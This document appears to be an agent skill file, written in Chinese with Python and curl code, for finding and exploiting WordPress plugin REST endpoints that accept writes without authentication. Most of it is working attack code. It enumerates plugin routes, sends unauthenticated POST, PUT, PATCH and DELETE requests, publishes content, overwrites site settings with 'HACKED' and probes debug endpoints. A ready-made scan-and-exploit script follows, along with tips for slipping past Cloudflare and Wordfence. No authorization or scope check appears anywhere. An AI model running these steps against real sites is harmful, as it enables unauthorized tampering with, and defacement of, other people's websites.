---
name: wp-plugin-rest-auth-bypass
description: "扫描 WordPress REST API 插件端点以寻找未认证的状态变更操作——发现无需认证即暴露的写端点（POST/PUT/PATCH/DELETE），枚举所有插件路由，并测试未经授权的内容发布、设置修改和数据泄露。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [any]
compatibility: Requires python3, curl
metadata:
  tags: [recon, wordpress, rest-api, auth-bypass, plugin-exploit, unauthorized-access, content-publishing]
  category: recon
  related_skills:
    - hunt-firebase
    - hunt-supabase
    - js-secrets-extraction
    - hunt-api-misconfig
    - source-leak-hunt
---

# WordPress 插件 REST API — 认证绕过

WordPress 插件会在 `/wp-json/{namespace}/` 注册自定义 REST API 路由。许多插件开发者忘记添加权限回调，使得状态变更端点（POST/PUT/PATCH/DELETE）对未认证用户开放。本技能枚举所有插件路由，识别缺少认证的写端点，并利用它们进行内容发布、设置修改和数据泄露。

## When to Use

- 目标是 WordPress 站点，且可通过 `/wp-json/wp/v2/users` 暴露用户。
- 你已从 `/wp-json/` 发现感兴趣的插件命名空间，但需要梳理它们的路由。
- 标准 WordPress 端点返回 401——但第三方插件端点可能不会。
- 你想找到隐藏的管理 URL、调试端点或未认证的写操作。

## Prerequisites

- 带 `requests` 库的 `python3`。
- 目标 WordPress 站点 URL。

## How to Run

```bash
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/wp-json/" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for ns in data.get('namespaces', []):
    print(ns)
"
```

## Procedure

### 阶段 1 — 枚举所有插件命名空间

```bash
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/wp-json/" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for ns in data.get('namespaces', []):
    print(ns)
"
```

过滤掉标准的 WordPress 命名空间，以找出第三方插件：

```
Standard: oembed/1.0, wp/v2, wp-site-health/v1, wp-block-editor/v1
Plugins:  gpl/v1, sliderrevolution, yoast/v1, elementor/v1, wc/v3, gf/v2, ...
```

### 阶段 2 — 梳理每个插件的所有路由

```python
import requests, json

BASE = "https://target.com"

# Get full route map
r = requests.get(f"{BASE}/wp-json/", timeout=10)
data = r.json()

for plugin_ns in ["gpl/v1", "gsf/v1", "sliderrevolution", "solidwp-mail/v1"]:
    r = requests.get(f"{BASE}/wp-json/{plugin_ns}/", timeout=10)
    if r.status_code == 200:
        routes = r.json().get('routes', {})
        for path, config in routes.items():
            methods = config.get('methods', [])
            args = list(config.get('endpoints', [{}])[0].get('args', {}).keys())
            print(f"  [{','.join(methods)}] {path}")
            if args:
                print(f"    Args: {args}")
```

### 阶段 3 — 识别状态变更端点（POST/PUT/PATCH/DELETE）

```python
# Test each POST/PUT/PATCH endpoint without auth
for path, config in routes.items():
    methods = config.get('methods', [])
    for method in methods:
        if method in ['POST', 'PUT', 'PATCH', 'DELETE']:
            r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)
            if r.status_code == 200:
                print(f"  ⚠️ [{method}] {path}: {r.text[:300]}")
```

**端点可利用的关键指标：**

| 响应 | 含义 |
|----------|---------|
| `"Post published"` / `"Success"` | 确认存在未认证写操作 |
| `"Missing parameter: X"` | 端点可用——只是需要正确的参数 |
| `"Sorry, you are not allowed"` | 已强制认证——安全 |
| `"rest_forbidden"` | 已强制认证——安全 |
| `"rest_missing_callback_param"` | 端点可用——带参数探测 |
| `"Invalid action"` | 端点接受输入——找出有效取值 |

### 阶段 4 — 利用未认证端点

**内容发布（最常见）：**
```python
# Try creating posts/pages/products
for post_type in ["post", "page", "product"]:
    r = requests.post(
        f"{BASE}/wp-json/{plugin_ns}/publish-builder-pro",
        json={"title": "Test", "post_type": post_type, "content": "test", "status": "publish"},
        timeout=10
    )
    if r.status_code == 200:
        print(f"  Created {post_type}: {r.json().get('post_url')}")
```

**设置修改：**
```python
# Try modifying WordPress options
r = requests.post(
    f"{BASE}/wp-json/{plugin_ns}/update-options",
    json={"option_name": "blogname", "option_value": "HACKED"},
    timeout=10
)
```

**隐藏端点发现：**
```python
# Some plugins leak admin URLs or debug info
for endpoint in ["login-url", "status", "config", "debug", "phpinfo"]:
    r = requests.get(f"{BASE}/wp-json/{plugin_ns}/{endpoint}", timeout=10)
    if r.status_code == 200:
        print(f"  {endpoint}: {r.text[:200]}")
```

## 快速扫描脚本

```python
import requests, json, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

# Step 1: Get all plugin namespaces
r = requests.get(f"{BASE}/wp-json/", timeout=10)
ns_list = r.json().get('namespaces', [])
std = ['oembed', 'wp/v2', 'wp-site-health', 'wp-block-editor', 'wpcom']
plugins = [n for n in ns_list if not any(s in n for s in std)]

print(f"Plugins: {len(plugins)}")

for ns in plugins:
    r = requests.get(f"{BASE}/wp-json/{ns}/", timeout=10)
    if r.status_code != 200:
        continue
    routes = r.json().get('routes', {})

    for path, cfg in routes.items():
        methods = cfg.get('methods', [])
        for method in methods:
            if method not in ['POST', 'PUT', 'PATCH', 'DELETE']:
                continue

            # Test without auth
            r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)

            if r.status_code == 200:
                text = r.text.lower()
                if 'forbidden' not in text and 'not allowed' not in text and 'rest_cannot' not in text:
                    print(f"\n⚠️ UNPROTECTED: [{method}] {ns}{path}")
                    print(f"   {r.text[:300]}")

                    # Try common payloads
                    for payload in [
                        {"title": "test", "content": "test", "status": "publish", "post_type": "page"},
                        {"title": "test", "content": "test", "post_type": "post"},
                        {"title": "test", "content": "test", "post_type": "product"},
                    ]:
                        r2 = requests.request(method, f"{BASE}/wp-json{path}", json=payload, timeout=10)
                        if 'published' in r2.text.lower() or 'created' in r2.text.lower() or 'success' in r2.text.lower():
                            print(f"   ✅ {r2.text[:200]}")
                            break
```

## Pitfalls

- **401 vs 400**：401 表示已强制认证。返回 400 且提示 “Missing parameter” 表示该端点确实可访问，只是需要正确的参数。
- **JSON 解析**：有些插件返回的 JSON 是字符串（双重编码）。在调用 `r.json()` 之前先检查 `r.text`。
- **速率限制**：快速测试可能触发安全插件。请求之间间隔 1-2 秒。
- **WAF 干扰**：Cloudflare 或 Wordfence 可能拦截对某些路径的 POST 请求。尝试使用不同的 `Content-Type` 头。
- **文章类型校验**：有些端点会根据已注册的类型校验 `post_type`。尝试 `post`、`page`、`product`、`attachment` 以及自定义类型。
- **清理测试数据**：如果你在测试期间创建了内容，请尽可能删除。如果插件没有未认证的 DELETE，请注明清理需要人工介入。

## Verification

- 端点必须在接受状态变更操作（POST/PUT/PATCH/DELETE）时不返回 401。
- 必须通过访问所创建内容的 URL 或检查响应来确认成功。
- 对于设置修改，请在利用后读取该设置，以验证更改已生效。
- 记录确切的 payload、端点路径、HTTP 方法和响应，以便复现。
